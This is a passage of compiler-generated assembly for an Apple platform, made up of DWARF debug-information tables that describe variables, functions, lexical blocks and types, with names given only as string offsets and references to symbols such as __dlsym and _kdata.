	.byte	19                              ; DW_FORM_ref4
	.byte	39                              ; DW_AT_prototyped
	.byte	25                              ; DW_FORM_flag_present
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	5                               ; Abbreviation Code
	.byte	5                               ; DW_TAG_formal_parameter
	.byte	0                               ; DW_CHILDREN_no
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	6                               ; Abbreviation Code
	.byte	15                              ; DW_TAG_pointer_type
	.byte	0                               ; DW_CHILDREN_no
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	7                               ; Abbreviation Code
	.byte	38                              ; DW_TAG_const_type
	.byte	0                               ; DW_CHILDREN_no
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	8                               ; Abbreviation Code
	.byte	36                              ; DW_TAG_base_type
	.byte	0                               ; DW_CHILDREN_no
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.byte	62                              ; DW_AT_encoding
	.byte	11                              ; DW_FORM_data1
	.byte	11                              ; DW_AT_byte_size
	.byte	11                              ; DW_FORM_data1
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	9                               ; Abbreviation Code
	.byte	22                              ; DW_TAG_typedef
	.byte	0                               ; DW_CHILDREN_no
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.byte	58                              ; DW_AT_decl_file
	.byte	11                              ; DW_FORM_data1
	.byte	59                              ; DW_AT_decl_line
	.byte	11                              ; DW_FORM_data1
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	10                              ; Abbreviation Code
	.byte	46                              ; DW_TAG_subprogram
	.byte	1                               ; DW_CHILDREN_yes
	.byte	17                              ; DW_AT_low_pc
	.byte	1                               ; DW_FORM_addr
	.byte	18                              ; DW_AT_high_pc
	.byte	6                               ; DW_FORM_data4
	.ascii	"\347\177"                      ; DW_AT_APPLE_omit_frame_ptr
	.byte	25                              ; DW_FORM_flag_present
	.byte	64                              ; DW_AT_frame_base
	.byte	24                              ; DW_FORM_exprloc
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.byte	58                              ; DW_AT_decl_file
	.byte	11                              ; DW_FORM_data1
	.byte	59                              ; DW_AT_decl_line
	.byte	11                              ; DW_FORM_data1
	.byte	39                              ; DW_AT_prototyped
	.byte	25                              ; DW_FORM_flag_present
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	63                              ; DW_AT_external
	.byte	25                              ; DW_FORM_flag_present
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	11                              ; Abbreviation Code
	.byte	52                              ; DW_TAG_variable
	.byte	0                               ; DW_CHILDREN_no
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	58                              ; DW_AT_decl_file
	.byte	11                              ; DW_FORM_data1
	.byte	59                              ; DW_AT_decl_line
	.byte	11                              ; DW_FORM_data1
	.byte	2                               ; DW_AT_location
	.byte	24                              ; DW_FORM_exprloc
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	12                              ; Abbreviation Code
	.byte	5                               ; DW_TAG_formal_parameter
	.byte	0                               ; DW_CHILDREN_no
	.byte	2                               ; DW_AT_location
	.byte	24                              ; DW_FORM_exprloc
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.byte	58                              ; DW_AT_decl_file
	.byte	11                              ; DW_FORM_data1
	.byte	59                              ; DW_AT_decl_line
	.byte	11                              ; DW_FORM_data1
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	13                              ; Abbreviation Code
	.byte	52                              ; DW_TAG_variable
	.byte	0                               ; DW_CHILDREN_no
	.byte	2                               ; DW_AT_location
	.byte	24                              ; DW_FORM_exprloc
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.byte	58                              ; DW_AT_decl_file
	.byte	11                              ; DW_FORM_data1
	.byte	59                              ; DW_AT_decl_line
	.byte	11                              ; DW_FORM_data1
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	14                              ; Abbreviation Code
	.byte	11                              ; DW_TAG_lexical_block
	.byte	1                               ; DW_CHILDREN_yes
	.byte	17                              ; DW_AT_low_pc
	.byte	1                               ; DW_FORM_addr
	.byte	18                              ; DW_AT_high_pc
	.byte	6                               ; DW_FORM_data4
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	15                              ; Abbreviation Code
	.byte	11                              ; DW_TAG_lexical_block
	.byte	1                               ; DW_CHILDREN_yes
	.byte	85                              ; DW_AT_ranges
	.byte	23                              ; DW_FORM_sec_offset
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	16                              ; Abbreviation Code
	.byte	52                              ; DW_TAG_variable
	.byte	0                               ; DW_CHILDREN_no
	.byte	2                               ; DW_AT_location
	.byte	24                              ; DW_FORM_exprloc
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.ascii	"\210\001"                      ; DW_AT_alignment
	.byte	15                              ; DW_FORM_udata
	.byte	58                              ; DW_AT_decl_file
	.byte	11                              ; DW_FORM_data1
	.byte	59                              ; DW_AT_decl_line
	.byte	11                              ; DW_FORM_data1
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	17                              ; Abbreviation Code
	.byte	1                               ; DW_TAG_array_type
	.byte	1                               ; DW_CHILDREN_yes
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	18                              ; Abbreviation Code
	.byte	33                              ; DW_TAG_subrange_type
	.byte	0                               ; DW_CHILDREN_no
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	55                              ; DW_AT_count
	.byte	11                              ; DW_FORM_data1
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	19                              ; Abbreviation Code
	.byte	36                              ; DW_TAG_base_type
	.byte	0                               ; DW_CHILDREN_no
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.byte	11                              ; DW_AT_byte_size
	.byte	11                              ; DW_FORM_data1
	.byte	62                              ; DW_AT_encoding
	.byte	11                              ; DW_FORM_data1
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	20                              ; Abbreviation Code
	.byte	4                               ; DW_TAG_enumeration_type
	.byte	1                               ; DW_CHILDREN_yes
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	11                              ; DW_AT_byte_size
	.byte	11                              ; DW_FORM_data1
	.byte	58                              ; DW_AT_decl_file
	.byte	11                              ; DW_FORM_data1
	.byte	59                              ; DW_AT_decl_line
	.byte	11                              ; DW_FORM_data1
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	21                              ; Abbreviation Code
	.byte	40                              ; DW_TAG_enumerator
	.byte	0                               ; DW_CHILDREN_no
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.byte	28                              ; DW_AT_const_value
	.byte	15                              ; DW_FORM_udata
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	22                              ; Abbreviation Code
	.byte	24                              ; DW_TAG_unspecified_parameters
	.byte	0                               ; DW_CHILDREN_no
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	23                              ; Abbreviation Code
	.byte	19                              ; DW_TAG_structure_type
	.byte	0                               ; DW_CHILDREN_no
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.byte	60                              ; DW_AT_declaration
	.byte	25                              ; DW_FORM_flag_present
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	24                              ; Abbreviation Code
	.byte	21                              ; DW_TAG_subroutine_type
	.byte	0                               ; DW_CHILDREN_no
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	39                              ; DW_AT_prototyped
	.byte	25                              ; DW_FORM_flag_present
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	25                              ; Abbreviation Code
	.byte	38                              ; DW_TAG_const_type
	.byte	0                               ; DW_CHILDREN_no
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	26                              ; Abbreviation Code
	.byte	46                              ; DW_TAG_subprogram
	.byte	1                               ; DW_CHILDREN_yes
	.byte	17                              ; DW_AT_low_pc
	.byte	1                               ; DW_FORM_addr
	.byte	18                              ; DW_AT_high_pc
	.byte	6                               ; DW_FORM_data4
	.ascii	"\347\177"                      ; DW_AT_APPLE_omit_frame_ptr
	.byte	25                              ; DW_FORM_flag_present
	.byte	64                              ; DW_AT_frame_base
	.byte	24                              ; DW_FORM_exprloc
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.byte	58                              ; DW_AT_decl_file
	.byte	11                              ; DW_FORM_data1
	.byte	59                              ; DW_AT_decl_line
	.byte	11                              ; DW_FORM_data1
	.byte	39                              ; DW_AT_prototyped
	.byte	25                              ; DW_FORM_flag_present
	.byte	63                              ; DW_AT_external
	.byte	25                              ; DW_FORM_flag_present
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	27                              ; Abbreviation Code
	.byte	46                              ; DW_TAG_subprogram
	.byte	1                               ; DW_CHILDREN_yes
	.byte	17                              ; DW_AT_low_pc
	.byte	1                               ; DW_FORM_addr
	.byte	18                              ; DW_AT_high_pc
	.byte	6                               ; DW_FORM_data4
	.ascii	"\347\177"                      ; DW_AT_APPLE_omit_frame_ptr
	.byte	25                              ; DW_FORM_flag_present
	.byte	64                              ; DW_AT_frame_base
	.byte	24                              ; DW_FORM_exprloc
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.byte	52                              ; DW_AT_artificial
	.byte	25                              ; DW_FORM_flag_present
	.byte	63                              ; DW_AT_external
	.byte	25                              ; DW_FORM_flag_present
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	28                              ; Abbreviation Code
	.byte	5                               ; DW_TAG_formal_parameter
	.byte	0                               ; DW_CHILDREN_no
	.byte	2                               ; DW_AT_location
	.byte	24                              ; DW_FORM_exprloc
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	52                              ; DW_AT_artificial
	.byte	25                              ; DW_FORM_flag_present
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	29                              ; Abbreviation Code
	.byte	19                              ; DW_TAG_structure_type
	.byte	1                               ; DW_CHILDREN_yes
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.byte	11                              ; DW_AT_byte_size
	.byte	5                               ; DW_FORM_data2
	.byte	58                              ; DW_AT_decl_file
	.byte	11                              ; DW_FORM_data1
	.byte	59                              ; DW_AT_decl_line
	.byte	11                              ; DW_FORM_data1
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	30                              ; Abbreviation Code
	.byte	13                              ; DW_TAG_member
	.byte	0                               ; DW_CHILDREN_no
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	58                              ; DW_AT_decl_file
	.byte	11                              ; DW_FORM_data1
	.byte	59                              ; DW_AT_decl_line
	.byte	11                              ; DW_FORM_data1
	.byte	56                              ; DW_AT_data_member_location
	.byte	11                              ; DW_FORM_data1
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	31                              ; Abbreviation Code
	.byte	53                              ; DW_TAG_volatile_type
	.byte	0                               ; DW_CHILDREN_no
	.byte	73                              ; DW_AT_type
	.byte	19                              ; DW_FORM_ref4
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	32                              ; Abbreviation Code
	.byte	21                              ; DW_TAG_subroutine_type
	.byte	1                               ; DW_CHILDREN_yes
	.byte	39                              ; DW_AT_prototyped
	.byte	25                              ; DW_FORM_flag_present
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	33                              ; Abbreviation Code
	.byte	19                              ; DW_TAG_structure_type
	.byte	1                               ; DW_CHILDREN_yes
	.byte	3                               ; DW_AT_name
	.byte	14                              ; DW_FORM_strp
	.byte	11                              ; DW_AT_byte_size
	.byte	11                              ; DW_FORM_data1
	.byte	58                              ; DW_AT_decl_file
	.byte	11                              ; DW_FORM_data1
	.byte	59                              ; DW_AT_decl_line
	.byte	11                              ; DW_FORM_data1
	.byte	0                               ; EOM(1)
	.byte	0                               ; EOM(2)
	.byte	0                               ; EOM(3)
	.section	__DWARF,__debug_info,regular,debug
Lsection_info:
Lcu_begin0:
.set Lset0, Ldebug_info_end0-Ldebug_info_start0 ; Length of Unit
	.long	Lset0
Ldebug_info_start0:
	.short	4                               ; DWARF version number
.set Lset1, Lsection_abbrev-Lsection_abbrev ; Offset Into Abbrev. Section
	.long	Lset1
	.byte	8                               ; Address Size (in bytes)
	.byte	1                               ; Abbrev [1] 0xb:0x715 DW_TAG_compile_unit
	.long	0                               ; DW_AT_producer
	.short	12                              ; DW_AT_language
	.long	47                              ; DW_AT_name
	.long	58                              ; DW_AT_LLVM_sysroot
	.long	166                             ; DW_AT_APPLE_sdk
.set Lset2, Lline_table_start0-Lsection_line ; DW_AT_stmt_list
	.long	Lset2
	.long	183                             ; DW_AT_comp_dir
	.quad	Lfunc_begin0                    ; DW_AT_low_pc
.set Lset3, Lfunc_end3-Lfunc_begin0     ; DW_AT_high_pc
	.long	Lset3
	.byte	2                               ; Abbrev [2] 0x32:0x15 DW_TAG_variable
	.long	235                             ; DW_AT_name
	.long	71                              ; DW_AT_type
                                        ; DW_AT_external
	.byte	1                               ; DW_AT_decl_file
	.byte	28                              ; DW_AT_decl_line
	.byte	9                               ; DW_AT_location
	.byte	3
	.quad	__dlsym
	.byte	3                               ; Abbrev [3] 0x47:0x5 DW_TAG_pointer_type
	.long	76                              ; DW_AT_type
	.byte	4                               ; Abbrev [4] 0x4c:0x10 DW_TAG_subroutine_type
	.long	92                              ; DW_AT_type
                                        ; DW_AT_prototyped
	.byte	5                               ; Abbrev [5] 0x51:0x5 DW_TAG_formal_parameter
	.long	92                              ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x56:0x5 DW_TAG_formal_parameter
	.long	93                              ; DW_AT_type
	.byte	0                               ; End Of Children Mark
	.byte	6                               ; Abbrev [6] 0x5c:0x1 DW_TAG_pointer_type
	.byte	3                               ; Abbrev [3] 0x5d:0x5 DW_TAG_pointer_type
	.long	98                              ; DW_AT_type
	.byte	7                               ; Abbrev [7] 0x62:0x5 DW_TAG_const_type
	.long	103                             ; DW_AT_type
	.byte	8                               ; Abbrev [8] 0x67:0x7 DW_TAG_base_type
	.long	242                             ; DW_AT_name
	.byte	6                               ; DW_AT_encoding
	.byte	1                               ; DW_AT_byte_size
	.byte	2                               ; Abbrev [2] 0x6e:0x15 DW_TAG_variable
	.long	247                             ; DW_AT_name
	.long	131                             ; DW_AT_type
                                        ; DW_AT_external
	.byte	1                               ; DW_AT_decl_file
	.byte	32                              ; DW_AT_decl_line
	.byte	9                               ; DW_AT_location
	.byte	3
	.quad	_kdata
	.byte	9                               ; Abbrev [9] 0x83:0xb DW_TAG_typedef
	.long	142                             ; DW_AT_type
	.long	253                             ; DW_AT_name
	.byte	2                               ; DW_AT_decl_file
	.byte	31                              ; DW_AT_decl_line
	.byte	8                               ; Abbrev [8] 0x8e:0x7 DW_TAG_base_type
	.long	262                             ; DW_AT_name
	.byte	7                               ; DW_AT_encoding
	.byte	8                               ; DW_AT_byte_size
	.byte	10                              ; Abbrev [10] 0x95:0x1e7 DW_TAG_subprogram
	.quad	Lfunc_begin1                    ; DW_AT_low_pc
.set Lset4, Lfunc_end1-Lfunc_begin1     ; DW_AT_high_pc
	.long	Lset4
                                        ; DW_AT_APPLE_omit_frame_ptr
	.byte	1                               ; DW_AT_frame_base
	.byte	111
	.long	730                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	149                             ; DW_AT_decl_line
                                        ; DW_AT_prototyped
	.long	768                             ; DW_AT_type
                                        ; DW_AT_external
	.byte	11                              ; Abbrev [11] 0xae:0x15 DW_TAG_variable
	.long	285                             ; DW_AT_name
	.long	636                             ; DW_AT_type
	.byte	1                               ; DW_AT_decl_file
	.byte	153                             ; DW_AT_decl_line
	.byte	9                               ; DW_AT_location
	.byte	3
	.quad	LOS_LOG0
	.byte	11                              ; Abbrev [11] 0xc3:0x15 DW_TAG_variable
	.long	285                             ; DW_AT_name
	.long	655                             ; DW_AT_type
	.byte	1                               ; DW_AT_decl_file
	.byte	154                             ; DW_AT_decl_line
	.byte	9                               ; DW_AT_location
	.byte	3
	.quad	LOS_LOG1
	.byte	11                              ; Abbrev [11] 0xd8:0x15 DW_TAG_variable
	.long	285                             ; DW_AT_name
	.long	636                             ; DW_AT_type
	.byte	1                               ; DW_AT_decl_file
	.byte	155                             ; DW_AT_decl_line
	.byte	9                               ; DW_AT_location
	.byte	3
	.quad	LOS_LOG2
	.byte	11                              ; Abbrev [11] 0xed:0x15 DW_TAG_variable
	.long	285                             ; DW_AT_name
	.long	667                             ; DW_AT_type
	.byte	1                               ; DW_AT_decl_file
	.byte	161                             ; DW_AT_decl_line
	.byte	9                               ; DW_AT_location
	.byte	3
	.quad	LOS_LOG3
	.byte	12                              ; Abbrev [12] 0x102:0xf DW_TAG_formal_parameter
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\350\001"
	.long	955                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	149                             ; DW_AT_decl_line
	.long	768                             ; DW_AT_type
	.byte	12                              ; Abbrev [12] 0x111:0xf DW_TAG_formal_parameter
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\340\001"
	.long	960                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	149                             ; DW_AT_decl_line
	.long	1571                            ; DW_AT_type
	.byte	13                              ; Abbrev [13] 0x120:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\334\001"
	.long	965                             ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	151                             ; DW_AT_decl_line
	.long	1576                            ; DW_AT_type
	.byte	13                              ; Abbrev [13] 0x12f:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\230\001"
	.long	1046                            ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	157                             ; DW_AT_decl_line
	.long	1632                            ; DW_AT_type
	.byte	14                              ; Abbrev [14] 0x13e:0x42 DW_TAG_lexical_block
	.quad	Ltmp11                          ; DW_AT_low_pc
.set Lset5, Ltmp17-Ltmp11               ; DW_AT_high_pc
	.long	Lset5
	.byte	13                              ; Abbrev [13] 0x14b:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\320\001"
	.long	1001                            ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	153                             ; DW_AT_decl_line
	.long	1124                            ; DW_AT_type
	.byte	13                              ; Abbrev [13] 0x15a:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\317\001"
	.long	1010                            ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	153                             ; DW_AT_decl_line
	.long	1609                            ; DW_AT_type
	.byte	15                              ; Abbrev [15] 0x169:0x16 DW_TAG_lexical_block
.set Lset6, Ldebug_ranges1-Ldebug_range ; DW_AT_ranges
	.long	Lset6
	.byte	16                              ; Abbrev [16] 0x16e:0x10 DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\300\001"
	.long	1034                            ; DW_AT_name
	.byte	16                              ; DW_AT_alignment
	.byte	1                               ; DW_AT_decl_file
	.byte	153                             ; DW_AT_decl_line
	.long	1620                            ; DW_AT_type
	.byte	0                               ; End Of Children Mark
	.byte	0                               ; End Of Children Mark
	.byte	14                              ; Abbrev [14] 0x180:0x4a DW_TAG_lexical_block
	.quad	Ltmp18                          ; DW_AT_low_pc
.set Lset7, Ltmp22-Ltmp18               ; DW_AT_high_pc
	.long	Lset7
	.byte	13                              ; Abbrev [13] 0x18d:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\270\001"
	.long	1001                            ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	154                             ; DW_AT_decl_line
	.long	1124                            ; DW_AT_type
	.byte	13                              ; Abbrev [13] 0x19c:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\267\001"
	.long	1010                            ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	154                             ; DW_AT_decl_line
	.long	1609                            ; DW_AT_type
	.byte	14                              ; Abbrev [14] 0x1ab:0x1e DW_TAG_lexical_block
	.quad	Ltmp21                          ; DW_AT_low_pc
.set Lset8, Ltmp22-Ltmp21               ; DW_AT_high_pc
	.long	Lset8
	.byte	16                              ; Abbrev [16] 0x1b8:0x10 DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\260\001"
	.long	1034                            ; DW_AT_name
	.byte	16                              ; DW_AT_alignment
	.byte	1                               ; DW_AT_decl_file
	.byte	154                             ; DW_AT_decl_line
	.long	1620                            ; DW_AT_type
	.byte	0                               ; End Of Children Mark
	.byte	0                               ; End Of Children Mark
	.byte	14                              ; Abbrev [14] 0x1ca:0x4a DW_TAG_lexical_block
	.quad	Ltmp23                          ; DW_AT_low_pc
.set Lset9, Ltmp27-Ltmp23               ; DW_AT_high_pc
	.long	Lset9
	.byte	13                              ; Abbrev [13] 0x1d7:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\250\001"
	.long	1001                            ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	155                             ; DW_AT_decl_line
	.long	1124                            ; DW_AT_type
	.byte	13                              ; Abbrev [13] 0x1e6:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\247\001"
	.long	1010                            ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	155                             ; DW_AT_decl_line
	.long	1609                            ; DW_AT_type
	.byte	14                              ; Abbrev [14] 0x1f5:0x1e DW_TAG_lexical_block
	.quad	Ltmp26                          ; DW_AT_low_pc
.set Lset10, Ltmp27-Ltmp26              ; DW_AT_high_pc
	.long	Lset10
	.byte	16                              ; Abbrev [16] 0x202:0x10 DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\240\001"
	.long	1034                            ; DW_AT_name
	.byte	16                              ; DW_AT_alignment
	.byte	1                               ; DW_AT_decl_file
	.byte	155                             ; DW_AT_decl_line
	.long	1620                            ; DW_AT_type
	.byte	0                               ; End Of Children Mark
	.byte	0                               ; End Of Children Mark
	.byte	14                              ; Abbrev [14] 0x214:0x67 DW_TAG_lexical_block
	.quad	Ltmp30                          ; DW_AT_low_pc
.set Lset11, Ltmp36-Ltmp30              ; DW_AT_high_pc
	.long	Lset11
	.byte	13                              ; Abbrev [13] 0x221:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\224\001"
	.long	1189                            ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	160                             ; DW_AT_decl_line
	.long	768                             ; DW_AT_type
	.byte	14                              ; Abbrev [14] 0x230:0x4a DW_TAG_lexical_block
	.quad	Ltmp31                          ; DW_AT_low_pc
.set Lset12, Ltmp35-Ltmp31              ; DW_AT_high_pc
	.long	Lset12
	.byte	13                              ; Abbrev [13] 0x23d:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\210\001"
	.long	1001                            ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	161                             ; DW_AT_decl_line
	.long	1124                            ; DW_AT_type
	.byte	13                              ; Abbrev [13] 0x24c:0xf DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\207\001"
	.long	1010                            ; DW_AT_name
	.byte	1                               ; DW_AT_decl_file
	.byte	161                             ; DW_AT_decl_line
	.long	1609                            ; DW_AT_type
	.byte	14                              ; Abbrev [14] 0x25b:0x1e DW_TAG_lexical_block
	.quad	Ltmp34                          ; DW_AT_low_pc
.set Lset13, Ltmp35-Ltmp34              ; DW_AT_high_pc
	.long	Lset13
	.byte	16                              ; Abbrev [16] 0x268:0x10 DW_TAG_variable
	.byte	3                               ; DW_AT_location
	.byte	145
	.ascii	"\360\001"
	.long	1034                            ; DW_AT_name
	.byte	16                              ; DW_AT_alignment
	.byte	1                               ; DW_AT_decl_file
	.byte	161                             ; DW_AT_decl_line
	.long	1811                            ; DW_AT_type
	.byte	0                               ; End Of Children Mark
	.byte	0                               ; End Of Children Mark
	.byte	0                               ; End Of Children Mark
	.byte	0                               ; End Of Children Mark
	.byte	17                              ; Abbrev [17] 0x27c:0xc DW_TAG_array_type
	.long	98                              ; DW_AT_type
	.byte	18                              ; Abbrev [18] 0x281:0x6 DW_TAG_subrange_type
	.long	648                             ; DW_AT_type
	.byte	22                              ; DW_AT_count
	.byte	0                               ; End Of Children Mark
	.byte	19                              ; Abbrev [19] 0x288:0x7 DW_TAG_base_type
	.long	297                             ; DW_AT_name
	.byte	8                               ; DW_AT_byte_size
	.byte	7                               ; DW_AT_encoding
	.byte	17                              ; Abbrev [17] 0x28f:0xc DW_TAG_array_type
	.long	98                              ; DW_AT_type
	.byte	18                              ; Abbrev [18] 0x294:0x6 DW_TAG_subrange_type
	.long	648                             ; DW_AT_type
	.byte	37                              ; DW_AT_count
	.byte	0                               ; End Of Children Mark
	.byte	17                              ; Abbrev [17] 0x29b:0xc DW_TAG_array_type
	.long	98                              ; DW_AT_type
	.byte	18                              ; Abbrev [18] 0x2a0:0x6 DW_TAG_subrange_type
	.long	648                             ; DW_AT_type
	.byte	43                              ; DW_AT_count
	.byte	0                               ; End Of Children Mark
	.byte	20                              ; Abbrev [20] 0x2a7:0x27 DW_TAG_enumeration_type
	.long	718                             ; DW_AT_type
	.byte	1                               ; DW_AT_byte_size
	.byte	4                               ; DW_AT_decl_file
	.byte	82                              ; DW_AT_decl_line
	.byte	21                              ; Abbrev [21] 0x2af:0x6 DW_TAG_enumerator
	.long	339                             ; DW_AT_name
	.byte	0                               ; DW_AT_const_value
	.byte	21                              ; Abbrev [21] 0x2b5:0x6 DW_TAG_enumerator
	.long	359                             ; DW_AT_name
	.byte	1                               ; DW_AT_const_value
	.byte	21                              ; Abbrev [21] 0x2bb:0x6 DW_TAG_enumerator
	.long	376                             ; DW_AT_name
	.byte	2                               ; DW_AT_const_value
	.byte	21                              ; Abbrev [21] 0x2c1:0x6 DW_TAG_enumerator
	.long	394                             ; DW_AT_name
	.byte	16                              ; DW_AT_const_value
	.byte	21                              ; Abbrev [21] 0x2c7:0x6 DW_TAG_enumerator
	.long	412                             ; DW_AT_name
	.byte	17                              ; DW_AT_const_value
	.byte	0                               ; End Of Children Mark
	.byte	9                               ; Abbrev [9] 0x2ce:0xb DW_TAG_typedef
	.long	729                             ; DW_AT_type
	.long	317                             ; DW_AT_name
	.byte	3                               ; DW_AT_decl_file
	.byte	31                              ; DW_AT_decl_line
	.byte	8                               ; Abbrev [8] 0x2d9:0x7 DW_TAG_base_type
	.long	325                             ; DW_AT_name
	.byte	8                               ; DW_AT_encoding
	.byte	1                               ; DW_AT_byte_size
	.byte	3                               ; Abbrev [3] 0x2e0:0x5 DW_TAG_pointer_type
	.long	741                             ; DW_AT_type
	.byte	4                               ; Abbrev [4] 0x2e5:0x1b DW_TAG_subroutine_type
	.long	768                             ; DW_AT_type
                                        ; DW_AT_prototyped
	.byte	5                               ; Abbrev [5] 0x2ea:0x5 DW_TAG_formal_parameter
	.long	775                             ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x2ef:0x5 DW_TAG_formal_parameter
	.long	775                             ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x2f4:0x5 DW_TAG_formal_parameter
	.long	768                             ; DW_AT_type
	.byte	5                               ; Abbrev [5] 0x2f9:0x5 DW_TAG_formal_parameter
	.long	93                              ; DW_AT_type
	.byte	22                              ; Abbrev [22] 0x2fe:0x1 DW_TAG_unspecified_parameters
	.byte	0                               ; End Of Children Mark
	.byte	8                               ; Abbrev [8] 0x300:0x7 DW_TAG_base_type
	.long	430                             ; DW_AT_name
	.byte	5                               ; DW_AT_encoding
	.byte	4                               ; DW_AT_byte_size
	.byte	9                               ; Abbrev [9] 0x307:0xb DW_TAG_typedef
	.long	786                             ; DW_AT_type
	.long	434                             ; DW_AT_name
	.byte	5                               ; DW_AT_decl_file
	.byte	36                              ; DW_AT_decl_line
